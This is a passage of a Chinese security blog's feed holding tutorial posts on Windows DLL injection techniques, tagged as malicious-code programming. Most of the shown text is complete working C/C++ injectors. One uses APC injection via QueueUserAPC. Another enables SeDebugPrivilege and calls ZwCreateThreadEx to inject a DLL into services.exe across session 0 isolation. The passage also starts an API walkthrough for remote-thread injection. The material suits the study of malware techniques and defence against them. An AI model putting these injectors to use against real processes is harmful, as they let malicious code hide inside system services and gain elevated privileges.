class="number">0</span>, dwDllPathLen = <span class="built_in">strlen</span>(pszDllname) + <span class="number">1</span>;</span><br><span class="line">    DWORD i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//获取进程的PID</span></span><br><span class="line">        dwPID = <span class="built_in">GetPidByName</span>(pszProcessName);</span><br><span class="line">        <span class="keyword">if</span> (dwPID == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;获取PID失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取所有线程ID</span></span><br><span class="line">        flag = <span class="built_in">GetAllThreadIdByProcessId</span>(dwPID, &amp;pThreadId, &amp;dwThreadLength);</span><br><span class="line">        <span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打开进程</span></span><br><span class="line">        hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">        <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//申请内存空间</span></span><br><span class="line">        pBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (pBaseAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;申请空间失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//向申请的空间写入内存</span></span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet);</span><br><span class="line">        <span class="keyword">if</span> (dwRet != dwDllPathLen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pLoadLibraryFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pLoadLibraryFunc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//向所有的线程插入APC函数</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwThreadLength; i++) &#123;</span><br><span class="line">            hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);</span><br><span class="line">            <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">                <span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress);</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                hThread = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line">    <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pThreadId) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[]pThreadId;</span><br><span class="line">        pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL flag=<span class="built_in">Inject</span>(<span class="string">&quot;TestApc.exe&quot;</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (flag == TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;失败\n&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CTestApcDlg::OnBnClickedOk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">SleepEx</span>(<span class="number">10000</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png"></p><p>然后打开我们的注入程序，看到提示已经注入成功。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/2.png"></p><p>点击确定按钮，就会弹出我们在DLL里写好的弹窗。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/3.png"></p><p>使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;APC注入&quot;&gt;&lt;a href=&quot;#APC注入&quot; class=&quot;headerlink&quot; title=&quot;APC注入&quot;&gt;&lt;/a&gt;APC注入&lt;/h4&gt;&lt;p&gt;APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>注入技术-突破session 0隔离的远线程注入</title>
    <link href="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-13T02:02:17.000Z</published>
    <updated>2021-07-27T08:46:23.887Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SESSION-0隔离"><a href="#SESSION-0隔离" class="headerlink" title="SESSION 0隔离"></a>SESSION 0隔离</h4><p>在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。</p><p>在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。</p><p>但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。</p><p>ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;processthreadsapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlstr.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteThreadInject</span><span class="params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;</span><br><span class="line"><span class="comment">//提升权限</span></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开近访问令牌失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">LUID luid;</span><br><span class="line"><span class="keyword">if</span> (LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查看特权信息失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;调节权限失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">LPVOID pDllAddr = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取注入进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">dwSize = lstrlen(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//printf(&quot;dwSize:%d\n&quot;, dwSize);</span></span><br><span class="line"><span class="comment">//申请内存</span></span><br><span class="line">pDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向申请的内存写入数据</span></span><br><span class="line">BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (WriteFlag == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HMODULE hNtdll = LoadLibrary(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hNtdll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取NTDLL地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取loadlibrary</span></span><br><span class="line">pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFuncProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ZwCreateThreadEx == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取ZW地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;创建失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">FreeLibrary(hNtdll);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">GetPID</span><span class="params">(<span class="keyword">char</span>* pszProcessName)</span> </span>&#123;</span><br><span class="line">HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">PROCESSENTRY32 pe = &#123; <span class="keyword">sizeof</span>(pe) &#125;;<span class="comment">//初始化</span></span><br><span class="line">USES_CONVERSION;</span><br><span class="line">CString ProcessName = A2T(pszProcessName);</span><br><span class="line">BOOL flag = Process32First(hSnap, &amp;pe);</span><br><span class="line"><span class="keyword">while</span> (flag) &#123;</span><br><span class="line"><span class="keyword">if</span> (lstrcmp(pe.szExeFile, ProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line">flag = Process32Next(hSnap, &amp;pe);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按下回车开始注入\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">DWORD dwPID = GetPID(<span class="string">&quot;services.exe&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="string">L&quot;C:\\Users\\b1ackie\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><p>打开程序，按下回车开始注入，显示注入成功</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>使用Process Explorer查看services.exe的导入模块</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;SESSION-0隔离&quot;&gt;&lt;a href=&quot;#SESSION-0隔离&quot; class=&quot;headerlink&quot; title=&quot;SESSION 0隔离&quot;&gt;&lt;/a&gt;SESSION 0隔离&lt;/h4&gt;&lt;p&gt;在早期操作系统中，所有的服务和应用程序都是运行在同一个session</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>注入技术-远程线程注入</title>
    <link href="https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-12T03:56:15.000Z</published>
    <updated>2021-07-27T08:46:29.318Z</updated>
    
    <content type="html"><![CDATA[<h4 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h4><p>远程线程注入是指一个进程在另一个进程中创建线程的技术。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h5><p>打开现有的本地进程对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">  DWORD dwDesiredAccess,</span><br><span class="line">  BOOL  bInheritHandle,</span><br><span class="line">  DWORD dwProcessId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。</p><p>bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。</p><p>dwProcessId：要打开的本地进程PID。</p><p>返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。</p><h5 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h5><p>在指定进程的虚拟地址空间内保留、提交或更改内存的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,</span><br><span class="line">  LPVOID lpAddress,</span><br><span class="line">  SIZE_T dwSize,</span><br><span class="line">  DWORD  flAllocationType,</span><br><span class="line">  DWORD  flProtect</span><br><span 